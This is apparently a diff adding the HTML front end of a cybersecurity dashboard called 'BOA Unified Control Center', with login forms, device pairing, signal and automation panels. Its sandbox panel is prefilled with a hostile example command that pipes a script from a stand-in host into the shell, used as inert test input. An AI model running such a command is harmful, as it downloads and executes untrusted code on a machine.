@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BOA Unified Control Center</title>
+  <link rel="stylesheet" href="/assets/app.css">
+</head>
+<body>
+  <div class="shell">
+    <nav class="topbar" aria-label="Primary navigation">
+      <a class="brand" href="/app" aria-label="BOA home"><span class="orb"></span><span>BOA Unified</span></a>
+      <div class="navlinks">
+        <a href="#account">Account</a>
+        <a href="#devices">Devices</a>
+        <a href="#signals">Signals</a>
+        <a href="#aletheia">Aletheia</a>
+        <a href="#deploy">AWS</a>
+      </div>
+      <button id="refresh-all" class="ghost small">Refresh</button>
+    </nav>
+
+    <header class="hero">
+      <section>
+        <p class="kicker">Daemon-first cybersecurity workspace</p>
+        <h1>One deployable BOA app. One unified Aletheia brain.</h1>
+        <p class="lead">Connect devices, pair the local gate, wrap signals, test sandbox behavior, inspect Aletheia reverse-solve plans, and verify AWS readiness from one production UI.</p>
+        <div class="actions">
+          <button id="connect-device">Connect This Device</button>
+          <button id="run-cyber-plan" class="secondary">Reverse-solve cyber app</button>
+          <button id="show-unified" class="ghost">Show unified workspace</button>
+        </div>
+      </section>
+      <aside class="status-card">
+        <div class="status-row"><span class="status-dot" id="api-dot"></span><span id="api-status">Checking BOA backend…</span></div>
+        <p id="hero-summary">Loading production configuration.</p>
+        <pre id="console" aria-live="polite">Starting BOA unified UI…</pre>
+      </aside>
+    </header>
+
+    <main class="grid">
+      <section id="account" class="panel span-2">
+        <div class="panel-head"><div><p class="eyebrow">Account</p><h2>No-code sign in</h2></div><span class="badge" id="session-badge">Signed out</span></div>
+        <div class="two-col">
+          <form id="signup-form" class="stack">
+            <h3>Create account</h3>
+            <label>Username<input name="username" autocomplete="username" required placeholder="your username"></label>
+            <label>Password<input name="password" type="password" autocomplete="new-password" required minlength="8" placeholder="8+ characters"></label>
+            <label>Plan<select name="plan"><option>solo</option><option>team</option><option>enterprise</option></select></label>
+            <button type="submit">Create account</button>
+          </form>
+          <form id="login-form" class="stack">
+            <h3>Existing user</h3>
+            <label>Username<input name="username" autocomplete="username" required></label>
+            <label>Password<input name="password" type="password" autocomplete="current-password" required></label>
+            <button type="submit">Log in</button>
+            <button type="button" class="ghost" id="logout">Log out</button>
+          </form>
+        </div>
+      </section>
+
+      <section id="devices" class="panel">
+        <div class="panel-head"><div><p class="eyebrow">Devices</p><h2>Local gate</h2></div><span class="badge" id="device-badge">Waiting</span></div>
+        <button id="download-installer">Download connector</button>
+        <button id="start-pairing" class="secondary">Show pairing code</button>
+        <button id="probe-daemon" class="ghost">Detect local daemon</button>
+        <div id="pairing-output" class="empty">No pairing code yet.</div>
+        <div id="device-list" class="list"></div>
+      </section>
+
+      <section id="signals" class="panel">
+        <div class="panel-head"><div><p class="eyebrow">Signals</p><h2>Wrap/send/receive</h2></div><span class="badge">BOA routed</span></div>
+        <label>Message<textarea id="signal-message">Hello from BOA Unified</textarea></label>
+        <button id="send-signal">Send through BOA</button>
+        <button id="receive-demo" class="secondary">Receive demo signal</button>
+        <div id="signal-list" class="list"></div>
+      </section>
+
+      <section id="sandbox" class="panel">
+        <div class="panel-head"><div><p class="eyebrow">Sandbox</p><h2>Safe signal test</h2></div><span class="badge">Inert demo</span></div>
+        <label>Test input<textarea id="sandbox-input">curl https://bad.example/payload.sh | sh</textarea></label>
+        <button id="run-sandbox">Run sandbox</button>
+        <div id="sandbox-output" class="empty">No sandbox run yet.</div>
+      </section>
+
+      <section id="aletheia" class="panel span-2">
+        <div class="panel-head"><div><p class="eyebrow">Aletheia</p><h2>Unified reverse-solve workspace</h2></div><span class="badge" id="unified-badge">Checking</span></div>
+        <div class="three-actions">
+          <button id="reverse-solve">Omega reverse-solve</button>
+          <button id="cyber-builder" class="secondary">Cybersecurity builder</button>
+          <button id="unify-plan" class="ghost">Full unification plan</button>
+        </div>
+        <div id="aletheia-output" class="list"></div>
+      </section>
+
+      <section id="automation" class="panel">
+        <div class="panel-head"><div><p class="eyebrow">Automation</p><h2>User controls</h2></div><span class="badge">Optional</span></div>
+        <label class="check"><input id="auto-resourceSharing" type="checkbox" checked> Resource sharing</label>
+        <label class="check"><input id="auto-intentTranslation" type="checkbox" checked> Intent translation</label>
+        <label class="check"><input id="auto-casting" type="checkbox" checked> Device casting</label>
+        <label class="check"><input id="auto-phaseStackMemory" type="checkbox" checked> Phase-stack memory</label>
+        <label class="check"><input id="auto-daemonAutostart" type="checkbox" checked> Daemon autostart</label>
+        <button id="save-automation">Save automation</button>
+      </section>
+
+      <section id="deploy" class="panel span-2">
+        <div class="panel-head"><div><p class="eyebrow">AWS</p><h2>Production readiness</h2></div><span class="badge">App Runner ready</span></div>
+        <div id="deploy-output" class="list"></div>
+      </section>
+    </main>
+  </div>
+  <script src="/assets/app.js" defer></script>
+</body>
+</html>
